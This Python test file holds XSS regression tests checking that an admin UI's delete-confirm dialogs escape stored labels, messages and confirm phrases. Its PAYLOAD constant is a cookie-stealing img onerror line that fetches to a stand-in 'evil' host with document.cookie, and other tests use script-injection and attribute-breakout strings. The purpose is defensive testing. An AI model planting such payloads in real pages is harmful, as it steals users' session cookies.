"""XSS regression tests for the delete-confirm slide-over dialogs (F2).

The record label rendered by the delete-confirm dialog comes straight from a
DB-stored ``name``/``title``/``email``/``username``/``label`` field — a stored
XSS payload must render escaped in every position it is interpolated
(header message, subtitle, bulk confirm phrase).
"""

from __future__ import annotations

from html import unescape
import re

from oridecon.admin.ui.organisms.admin_slide_over import (
    render_bulk_delete_confirm,
    render_delete_confirm,
    render_slide_over_fragment,
)
from oridecon.ui import js_string, trusted_html

PAYLOAD = "<img src=x onerror=\"fetch('https://evil/c?'+document.cookie)\">"
ESCAPED = "&lt;img src=x onerror=&quot;fetch(&#x27;https://evil/c?&#x27;+document.cookie)&quot;&gt;"


class TestSlideOverContentBoundary:
    def test_plain_content_string_is_rendered_as_text(self) -> None:
        html = render_slide_over_fragment("Title", "<script>alert(1)</script>")

        assert "<script>alert(1)</script>" not in html
        assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html

    def test_trusted_content_requires_an_attributed_capability(self) -> None:
        html = render_slide_over_fragment(
            "Title",
            trusted_html("<strong>Owned</strong>", source="test-owned panel"),
        )

        assert "<strong>Owned</strong>" in html


class TestDeleteConfirm:
    def test_input_identity_is_stable_and_bound_to_the_delete_url(self) -> None:
        first = render_delete_confirm(
            record_label="One",
            delete_url="/admin/x/1",
            table_key="x",
        )
        second = render_delete_confirm(
            record_label="One",
            delete_url="/admin/x/1",
            table_key="x",
        )
        other = render_delete_confirm(record_label="Two", delete_url="/admin/x/2")
        input_id = re.search(r'<input[^>]*id="([^"]+)"', first)

        assert first == second
        assert input_id is not None
        assert f'for="{input_id.group(1)}"' in first
        assert input_id.group(1) not in other
        assert 'id="delete-confirm-input"' not in first
        assert 'hx-target="#oridecon-table-data-x"' in first

    def test_record_label_escaped_in_default_message(self) -> None:
        html = render_delete_confirm(record_label=PAYLOAD, delete_url="/admin/x/1")
        assert PAYLOAD not in html
        assert "&lt;img" in html

    def test_record_label_escaped_in_subtitle(self) -> None:
        html = render_delete_confirm(record_label=PAYLOAD, delete_url="/admin/x/1")
        assert f'Deleting: "{PAYLOAD}"' not in html
        assert 'Deleting: "&lt;img src=x' in html

    def test_default_message_strong_markup_kept_structured(self) -> None:
        html = render_delete_confirm(record_label=PAYLOAD, delete_url="/admin/x/1")
        assert "<strong>" in html
        assert "<strong><img" not in html
        assert "&lt;/strong&gt;" not in html

    def test_plain_custom_message_is_text_not_implicit_markup(self) -> None:
        html = render_delete_confirm(
            record_label=PAYLOAD,
            delete_url="/admin/x/1",
            message="Are you sure? <strong>No undo</strong>.",
        )
        assert "Are you sure? <strong>No undo</strong>." not in html
        assert "Are you sure? &lt;strong&gt;No undo&lt;/strong&gt;." in html

    def test_explicit_trusted_custom_message_preserves_owned_markup(self) -> None:
        html = render_delete_confirm(
            record_label="Record",
            delete_url="/admin/x/1",
            message=trusted_html(
                "Are you sure? <strong>No undo</strong>.",
                source="test-owned confirmation copy",
            ),
        )
        assert "Are you sure? <strong>No undo</strong>." in html

    def test_extra_warning_escaped(self) -> None:
        html = render_delete_confirm(
            record_label="safe",
            delete_url="/admin/x/1",
            extra_warning=PAYLOAD,
        )
        assert PAYLOAD not in html
        assert "&lt;img" in html


class TestBulkDeleteConfirm:
    def test_selected_ids_are_frozen_into_the_confirmation_panel(self) -> None:
        html = render_bulk_delete_confirm(
            record_count=2,
            bulk_url="/admin/x/bulk",
            record_ids=("one", 'two"><script>alert(1)</script>'),
            table_key="x",
        )

        assert html.count('name="ids"') == 2
        assert 'value="one"' in html
        assert "<script>alert(1)</script>" not in html
        assert 'hx-include="closest [role=&#x27;dialog&#x27;]"' in html
        assert 'hx-target="#oridecon-table-data-x"' in html

    def test_action_is_serialized_for_hx_vals(self) -> None:
        action = '"><script>alert(1)</script>'
        html = render_bulk_delete_confirm(
            record_count=1,
            bulk_url="/admin/x/bulk",
            action=action,
        )
        match = re.search(r'hx-vals="([^"]+)"', html)

        assert match is not None
        assert unescape(match.group(1)) == f'{{"action":{js_string(action)}}}'
        assert "<script>alert(1)</script>" not in html

    def test_confirm_phrase_escaped_in_label_span(self) -> None:
        html = render_bulk_delete_confirm(
            record_count=3,
            bulk_url="/admin/x/bulk",
            confirm_phrase=PAYLOAD,
        )
        assert PAYLOAD not in html
        assert "&lt;img" in html

    def test_confirm_phrase_escaped_in_placeholder_attribute(self) -> None:
        html = render_bulk_delete_confirm(
            record_count=3,
            bulk_url="/admin/x/bulk",
            confirm_phrase=PAYLOAD,
        )
        assert f'placeholder="Type {PAYLOAD} here"' not in html
        assert (
            'placeholder="Type &lt;img src=x onerror=&quot;fetch(&#x27;https://evil/c?&#x27;'
            '+document.cookie)&quot;&gt; here"'
        ) in html

    def test_confirm_phrase_is_serialized_for_alpine_expression(self) -> None:
        html = render_bulk_delete_confirm(
            record_count=3,
            bulk_url="/admin/x/bulk",
            confirm_phrase=PAYLOAD,
        )
        match = re.search(r'x-bind:disabled="([^"]+)"', html)

        assert match is not None
        assert unescape(match.group(1)) == f"confirmText !== {js_string(PAYLOAD)}"

    def test_default_message_count_escaped(self) -> None:
        html = render_bulk_delete_confirm(record_count=3, bulk_url="/admin/x/bulk")
        assert "<strong>3</strong>" in html
        assert "&lt;strong&gt;" not in html

    def test_subtitle_escaped(self) -> None:
        html = render_bulk_delete_confirm(
            record_count=3,
            bulk_url="/admin/x/bulk",
            subtitle=f'Deleting: "{PAYLOAD}"',
        )
        assert f'Deleting: "{PAYLOAD}"' not in html
        assert 'Deleting: "&lt;img' in html
